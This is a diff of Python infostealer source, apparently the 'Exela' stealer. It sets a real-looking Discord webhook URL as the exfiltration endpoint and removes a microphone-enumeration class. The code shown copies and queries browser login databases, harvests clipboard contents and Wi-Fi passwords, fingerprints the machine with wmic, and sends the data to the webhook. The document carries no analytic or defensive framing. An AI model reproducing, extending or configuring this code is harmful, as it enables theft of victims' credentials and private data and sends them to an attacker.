@@ -6,7 +6,7 @@ from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
 from pynput import keyboard
 
-UrLxD = '%REPLACE_ME_FOR_QUiCADXD%'
+UrLxD = 'https://discord.com/api/webhooks/1150093917832888360/Eplh0sC5bo3EimYM7dBLDJvHFw2y0W77VcYlhM4blvgSBE5hvEA1ccsCX1SwC1_Rm7dV'
 Anti_Vm = "false"
 wantS = "%StartuP%"
 methodxd = "%MethoD%"
@@ -74,34 +74,7 @@ class SubModules:
         except:
             return "Decryption Error!, Data cant be decrypt"
 
-class GetMic:
-    def __init__(self):
-        self.winmm = ctypes.WinDLL('winmm.dll')
-        self.microphone_list = []
 
-    class WAVEINCAPS(ctypes.Structure):
-        _fields_ = [
-            ('wMid', ctypes.c_ushort),
-            ('wPid', ctypes.c_ushort),
-            ('vDriverVersion', ctypes.c_ulong),
-            ('szPname', ctypes.c_char * 32),
-            ('dwFormats', ctypes.c_ulong),
-            ('wChannels', ctypes.c_ushort),
-            ('wReserved1', ctypes.c_ushort)
-        ]
-
-    def list_microphones(self) -> list:
-        num_devices = self.winmm.waveInGetNumDevs()
-        
-        for i in range(num_devices):
-            caps = self.WAVEINCAPS()
-            result = self.winmm.waveInGetDevCapsA(i, ctypes.byref(caps), ctypes.sizeof(caps))
-            
-            if result == 0:
-                device_name = caps.szPname.decode('utf-8')
-                self.microphone_list.append(device_name)
-        
-        return self.microphone_list
 class QuicaxdExela:
     def __init__(self):
         self.hook = dhooks.Webhook(UrLxD,avatar_url="https://i.hizliresim.com/94iepii.jfif", username="quicaxd")
@@ -170,7 +143,6 @@ class QuicaxdExela:
         }
         for _,path in full_browsers.items():
             for f in profiles:
-
                  self.connect_to_database(path, f, "Local")
                  self.connect_to_database2(path, f, "Local") 
                  self.connect_to_database3(path, f, "Local")
@@ -315,10 +287,6 @@ class QuicaxdExela:
             if not os.path.isfile(path):
                 return
             else:
-                try:
-                    ana_dizin, profil_kismi = profPath.replace('\\User Data', '').replace('\\', "_").rsplit('Local', 1)
-                except:
-                    ana_dizin, profil_kismi = profPath.replace('\\User Data', '').replace('\\', "_").rsplit('Roaming', 1)
                 self.login_data_path = path
                 shutil.copy2(self.login_data_path, self.backup_login_data_path)
                 conn = sqlite3.connect(self.backup_login_data_path)
@@ -983,8 +951,6 @@ class QuicaxdExela:
         command = "wmic csproduct get uuid"
         run = str(subprocess.check_output(command, shell=True).decode('utf-8').split("\n")[1].strip())
         tmp = os.getenv('temp')
-        mic_finder = GetMic()
-        mic_data = mic_finder.list_microphones()
         if not os.path.isdir(tmp + f"\\{run}"):
             os.mkdir(tmp + f"\\{run}")
         shutil.rmtree(tmp+f'\\{run}')
@@ -1116,14 +1082,6 @@ class QuicaxdExela:
             self.get_last_clipboard_text(run)
             self.get_last_clipboard_image(run)        
         if 45 > 3:
-            with open(tmp + f"\\{run}\\system_info.txt", "a", encoding="utf-8", errors="ignore") as micro:
-                micro.write("----------------------https://t.me/ExelaStealer----------------------\n======================================================================\n")
-            if mic_data:
-                with open(tmp + f"\\{run}\\system_info.txt", "a", encoding="utf-8", errors="ignore") as micro:
-                    micro.write("Listed Microphone's\n======================================================================\n")
-                for mics in mic_data:
-                    with open(tmp + f"\\{run}\\system_info.txt", "a", encoding="utf-8", errors="ignore") as micro:
-                        micro.write("Listed Microphone's\n" + mics + "\n")
             self.get_all_system_data()
         if 7855 < 8888:
             self.GetWifiPasswords(tmp + f"\\{run}")
